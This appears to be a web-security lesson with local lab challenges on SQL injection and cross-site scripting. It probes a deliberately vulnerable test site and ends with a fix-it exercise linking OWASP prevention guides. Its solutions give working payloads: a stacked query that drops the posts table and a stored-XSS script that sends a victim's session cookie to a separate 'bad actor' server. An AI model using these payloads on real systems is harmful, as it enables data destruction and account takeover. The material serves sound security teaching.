# Cross-site Scripting and SQL Injection

OWASP is one of those unofficial official organizations that holds a lot of sway in the security world.  They publish a few guides that tend to be seen as authoritative.  One of those guides is the every-few-yearly [OWASP Top Ten](https://owasp.org/www-project-top-ten/).  

These are the most common and most serious security flaws and vulnerabilities on the web today.  Just for the sake of thoroughness--and because, just maybe, you are wary of clicking on some random link you happened across--, here is OWASP's most recent top 10:

1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entities
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging and Monitoring

Feel free to peruse the list to get a feel for what you're up against (or working with). We're going to spend today worrying about SQL Injection and Cross-Site Scripting.

## SQL Injection
We are already familiar with basic SQL commands, such as this fine query that returns everything in the "users" table:

```SQL
SELECT * FROM users;
```
So how does this work in the context of a website?

Well, let's say you have a website where you sell Compact Discs on the Internet.  A potential customer does a search for "Nirvana".  See if you can construct a likely SQL query for that information.

```sql
SELECT * FROM albums WHERE artist = "Nirvana"
```

You make that database call, then display the results on your page.  Of course, you can't just hope that people only search for "Nirvana", so you are going to have to deal with user input somehow.

If your backend uses Python, your database query might look something like this:

```python
search_results = sql.make_query(f"SELECT * FROM albums WHERE artist = {user_input}")
```

Just take whatever a user types in and carry it over to your database.  That sure does seem convenient. You hardly have to change the basic SQL query. And really, how else would you know what query to make, unless the user tells you.  The problem with this is that you are opening up a direct path from random people on the internet (some of whom type while wearing hoodies) to your precious, precious data.  

In all likelihood your database doesn't just have googleable information like "how many albums did Nirvana put out?", but also usernames, passwords, credit cards...  

OK, then the solution is simple: no more user input! Lock everything up and turn off the lights.

Unfortunately, this would pretty much ruin the internet.  In the end, you have to learn to deal with user input, unless you are prepared to hard-code every query ahead of time, or maybe just spit out all the information you are willing to put out there and let users ctrl+f the information they want.  

So how would you abuse the above SQL query?  Let's go to a vulnerable website to find out.

[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) is a (deliberately) poorly designed website that offers some insights in what <i>not</i> to do.

Let's go ahead and create an account: [sign up](http://testphp.vulnweb.com/signup.php)

Oh look, all of our account information, including credit card number, is being sent over HTTP.  Even an unsophisticated attacker could get this information.  Even your browser can show you!

[Form Data](signup.png)

Let's kep browsing.  If we click around the artists, we can see that a query is formed in the URL bar:

```bash
http://testphp.vulnweb.com/artists.php?artist=1
```
If we suppose that the "1" is likely to be direct input to a databse query, we should be able to get more than just information about artist 1.

```bash
http://testphp.vulnweb.com/artists.php?artist='1
```

It might not seem that exciting, but it's a gold mine for a potential attacker.  

What do we learn from this error message?

```bash
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62
```
---
What kind of database is this? 
(MySQL.  Will this help us?)

How many parameters does the function take?
(at least one)

What are the parameter types?  
(the first one is a boolean -- http://testphp.vulnweb.com/artists.php?artist=true is the same as artist=1)

Where is this file stored on the server?
(/hj/var/www/artists.php)

Is this writen in JavaScript?
(probably not, PHP (snake-case))
---

This is the kind of result you might get from deploying something in debug mode (both Django and React have "debug" and "production" modes).  You want helpful error messages for yourself while you are devloping, but users should not be given such detailed information.

(have you ever noticed that, when you enter your username and password, that some sites will give you more information than others...)

So if we suppose that the database is MySQL, how do we use that information to find out what the database's table are?

Do we have a better idea of how the database is constructed?

This is just a taste for now, but feel free to play around some more on your own.  

## Cross-Site Scripting

Now we're going to turn away from the deleberately weak David to the Goliath of the internet: Google.

But Google is a friendly Goliath.  We can even coax it into saying "hi" to little old us.  From the developer tools console:

```javascript
alert('hi')
```

You know, I've always thought that Google's homepage was a little too exciting.  Let's tone it down:

```javascript
document.write("what?")
```

Maybe we can redesign their logo for them:

```javascript
document.write("<h1>GOOGLE</h1>")
```

We can even add an image:

```javascript
document.write("<img src='https://catmacros.files.wordpress.com/2009/07/pc_crash.jpg'>")
```

But what about another link:

```javascript
document.write("<img src='https://www.pexels.com/photo/adorable-animal-blur-cat-617278/'>")
```

Some defences!  Maybe this won't be quite as easy as we thought.

OK, enough fun and games with HTML.  Let's get down to malicious Javascript business.

We are going to inject Javascript into this webpage using nothing but... Javascript.

First we'll go into the console of the developer tools and create the script tag that will hold our dangerous content:

```javascript
let script = document.createElement('script');
```

Now we really get to use our imaginations.  You can put whatever Javascript you want in here.  What can you get away with?  We'll do something nice and boring...for now.

```javascript
script.innerText = "console.log('asdfasdfasfd')"
```

OK, so now we have a complete script tag ready to go.  But unfortunately, it's just hanging out in the developer console.  How can we get it onto the webpage where it can wreak havoc?

```javascript
document.head.append(script);
```

Nothing looks different, but it is.  Go into the "Elements" tab of the developer tools and look inside the <head> tag.  What do you see?

What we've just been doing is called cross-site scripting (XSS).  Well, it's at least part of cross-site scripting.  Real cross-site scripting is when a malicous agent is able to put content into a server that other users then recieve.  What we were just doing was restricted to our own browser--no one else went to google.com and saw anything we did locally.  The only victim is ourselves.  The hard part of cross-site scripting is getting your content onto the server so that other people are affected.  

There are a few basic ways of doing this.  For example, you might pay off the server admin to insert a little something into the source code.  But today we are more interested in the technical side of things.

At this point you might be thinking to yourself, "Isn't cross-site scripting just like SQL injection?".  And you would have a point.  When it comes down to it, in both cases we are doing stuff to databases that we aren't supposed to be doing.

But there are some very important differences.

Let's think about a website that allows users to make posts (how novel!).  Users sign up with a username and password, and are then able to submit posts.  When the user submits a post, a POST request (no pun intended) is made and a SQL command is executed, storing the new post in the database.  When someone views the page, the database retrieves all its posts, and hands the information off to the frontend where it is displayed for the end-user.

If you were interested in performing a SQL injection attack, you would only care about the first half of the sequence.  You want information directly from the database.  But if you were performing a cross-site scripting attack, you are only interested in the database as a means to get your HTML/Javascript onto people's browsers.  Your real target is individual users and their browsers.

Let's take it half-a-step further.

You could think of spam posts as a very low-level form of cross-site scripting.  Let's return to our website where users make posts.  A new user (hAcKrBoI3) signs up and decides to ruin everything for everyone.  He starts making posts that have links like [Discount Code For 10 Free Uber Rides!!](https://www.youtube.com/watch?v=dQw4w9WgXcQ).  Since users' posts are simply inserted and retrieved from the database as is, anyone who views the webpage is a potential victim.  And if lots of people visit the site, at least <i>some</i> people are going to click on the link.  Did you?  Don't feel too bad--it is a good song in its way.






## Challenges


### Setup
The challenges for today will require a little bit of setup.  

1. Clone this repo and cd into the base directory.
2. Create a virtual environment

```bash
python -m venv venv
```

3. Activate your virtual environment

```bash
source venv/bin/activate
```

4. Install the necessary Python module(s)

```bash
pip install -r requirements.txt
```

Run the bash script:
```bash
./start.sh
```
It will populate the database, and start the server.  You can re-run the script whenever you want to restart the server.

Go to localhost:2222/ and poke around.

### SQL Injection Challenge: Little Bobby Tables
Some people just want to watch the world burn.  Today you'll get to sample that delicious nihilism as you (relatively) easily break things that other people spent so much more time making.  

Don't get me wrong, hackers aren't all bleakness and evil--they also love a good laugh.  In the dark corners of the internet, where everyone types with a hoodie on, there's a well-known internet comic.

[Here is one of his comics](https://xkcd.com/327/)

Unfortunately, I'm not sure I get the joke.  What could it mean?  

Note: Your database might become corrupted as you work through this challenge.  If so, simply start fresh by deleting users_posts.db, and running the start script.  When you do figure it out, you'll definitely have to re-create the database.

You might find [this](https://sqlitebrowser.org/) helpful too.  It's a handy GUI for interacting with the database.  You can view the tables and make sample queries with it.

---
###<span style="color: red;">Solution</span> 
In username:
```SQL
username'; DROP TABLE posts;
```
---


### Cross-Site Scripting Challenge: Claim Your Free Ipod!!!11
This one has some extra setup.  You'll be running an additional server on localhost:5000.  cd into badActor, and in another terminal (split terminal):
1. npm install
2. node badActorServer.js

Now you have two whole servers running at the same time.

Savy internet users know to avoid Nigerian royals and herbal enhancements... But who can resist a brand new Ipod?  In a moment of weakness, you might even be tempted to click that flashing link and roll the dice.  Let's find out why you shouldn't do that.

This one is a little more complicated than the first.

Your goal is to get an unsuspecting FakeSociety user to click on a link.  You'll have to figure out some way to get that content into FakeSociety's server, onto their page, and make it tempting enough to click.  That link will direct the user to your nefarious server (badActorServer.js) and take along the user's bank account session cookie.  That cookie contains the user's bank account login information.  You should see the users bank account login information displayed to you on the page.  Then--and here's the irony--you're going to go out and buy your own Ipod!

---
###<span style="color: red;">Solution</span> 
In post:
```html
    <script>let baseUrl = 'http://127.0.0.1:5000/'; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>

```
---

## A Christmas Carol Challenge: The Ethical Hacker
After years of cybrcrime, you start having second thoughts about your place in the world.  Sure, you have lots of Ipods, and no school records, but in the end, aren't you really just a social parasite?  It's time to make amends.  Since you know how to break it, it shouldn't be that hard to fix it.  

Change the source code so that your old attacks don't work anymore.  Here are some resources that might help:

[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

[OWASP Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)